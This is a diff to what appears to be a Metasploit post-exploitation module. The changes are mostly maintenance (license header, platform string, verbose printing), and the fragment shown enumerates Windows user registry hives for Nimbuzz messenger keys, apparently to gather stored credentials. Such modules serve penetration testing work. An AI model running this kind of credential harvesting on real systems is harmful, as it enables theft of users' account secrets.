@@ -1,16 +1,13 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
 require 'msf/core/post/windows/registry'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
@@ -29,8 +26,7 @@ class Metasploit3 < Msf::Post
 					'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
 					'SecurityXploded Team', #www.SecurityXploded.com
 				],
-			'Version'       => '$Revision$',
-			'Platform'      => [ 'windows' ],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 	end
@@ -50,7 +46,7 @@ class Metasploit3 < Msf::Post
 			next unless k.include? "S-1-5-21"
 			next if k.include? "_Classes"
 
-			print_status("Looking at Key #{k}") if datastore['VERBOSE']
+			vprint_status("Looking at Key #{k}")
 			subkeys = registry_enumkeys("HKU\\#{k}\\Software\\Nimbuzz\\")
 
 			if subkeys == nil or subkeys == ""
